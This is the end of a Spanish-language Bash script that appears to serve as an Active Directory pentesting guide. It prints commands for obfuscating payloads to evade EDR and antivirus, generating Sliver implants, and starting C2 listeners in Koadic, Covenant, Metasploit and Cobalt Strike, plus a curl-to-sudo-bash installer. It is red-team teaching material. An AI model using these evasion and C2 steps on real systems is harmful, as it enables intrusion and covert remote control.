    press_enter
}

obfuscation_techniques_info() {
    show_banner
    echo -e "${GREEN}Técnicas de Ofuscación:${NC}"
    echo
    show_command "Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN,ALL,1'" "Ofuscar scripts PowerShell"
    show_command "garble -literals -tiny -seed=random payload.go" "Ofuscar código Go (para herramientas como Sliver)"
    echo -e "${MAGENTA}Objetivo:${NC} Hacer que el código malicioso sea difícil de detectar and analizar."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Invoke-Obfuscation, Garble, Shellter."
    echo -e "${MAGENTA}Notas:${NC} La ofuscación es esencial para evadir soluciones EDR and antivirus. Puede incluir ofuscación de strings, variables, funciones, and flujo de control."
    press_enter
}

# --- Herramientas de Comando y Control ---

koadic_info() {
    show_banner
    echo -e "${GREEN}Koadic C3 - COM Command & Control:${NC}"
    echo
    show_command "git clone https://github.com/zerosum0x0/koadic" "Instalar Koadic"
    show_command "./koadic" "Iniciar Koadic"
    show_command "use stager/js/mshta" "Usar stager de MSHTA"
    show_command "set LHOST 192.168.1.10" "Configurar IP del listener"
    show_command "run" "Ejecutar stager"
    echo -e "${MAGENTA}Objetivo:${NC} Establecer un canal de comando and control usando binarios nativos de Windows."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Koadic, stagers de MSHTA/WMIC/regsvr32."
    echo -e "${MAGENTA}Notas:${NC} Koadic es un framework post-explotación similar a Meterpreter but focused on Windows environments. Usa JavaScript and COM objects."
    press_enter
}

covenant_info() {
    show_banner
    echo -e "${GREEN}Covenant - .NET C2 Framework:${NC}"
    echo
    show_command "git clone --recurse-submodules https://github.com/cobbr/Covenant" "Instalar Covenant"
    show_command "dotnet run" "Iniciar Covenant"
    echo -e "${MAGENTA}Objetivo:${NC} Framework de C2 basado en .NET para equipos Red Team."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Covenant, Grunts (implants)."
    echo -e "${MAGENTA}Notas:${NC} Covenant proporciona una interfaz web para gestionar implants and operaciones. Es altamente configurable and extensible."
    press_enter
}

sliver_info() {
    show_banner
    echo -e "${GREEN}Sliver - Framework de C2:${NC}"
    echo
    show_command "curl https://sliver.sh/install|sudo bash" "Instalar Sliver"
    show_command "sliver" "Iniciar Sliver"
    show_command "generate --http 192.168.1.10 --save /tmp/payload.exe" "Generar implant"
    echo -e "${MAGENTA}Objetivo:${NC} Framework de C2 moderno and open source para operaciones Red Team."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Sliver, implants multiplataforma."
    echo -e "${MAGENTA}Notas:${NC} Sliver soporta múltiples protocolos (HTTP, HTTPS, DNS) and tiene características avanzadas de evasión."
    press_enter
}

metasploit_info() {
    show_banner
    echo -e "${GREEN}Metasploit - Framework de Explotación:${NC}"
    echo
    show_command "msfconsole" "Iniciar Metasploit"
    show_command "use exploit/multi/handler" "Usar handler genérico"
    show_command "set payload windows/x64/meterpreter/reverse_http" "Configurar payload"
    show_command "set LHOST 192.168.1.10" "Configurar IP del listener"
    show_command "exploit" "Ejecutar handler"
    echo -e "${MAGENTA}Objetivo:${NC} Framework completo de explotación and post-explotación."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Metasploit, Meterpreter, módulos de explotación."
    echo -e "${MAGENTA}Notas:${NC} Metasploit es el framework más conocido. Meterpreter proporciona capacidades avanzadas de post-explotación en memoria."
    press_enter
}

cobalt_strike_info() {
    show_banner
    echo -e "${GREEN}Cobalt Strike - Framework de Red Team:${NC}"
    echo
    show_command "./teamserver 192.168.1.10 password" "Iniciar teamserver"
    echo -e "${MAGENTA}Objetivo:${NC} Framework comercial para operaciones de Red Team altamente sofisticadas."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Cobalt Strike, Beacons, Aggressor Script."
    echo -e "${MAGENTA}Notas:${NC} Cobalt Strike es la herramienta preferida por muchos Red Teams profesionales. Ofrece capacidades avanzadas de C2, evasión, and simulación de adversarios."
    press_enter
}

# ==============================================
# INICIO DE LA APLICACIÓN
# ==============================================

echo -e "${GREEN}Iniciando Guía Completa de Pentesting de Active Directory...${NC}"
sleep 2
main_menu
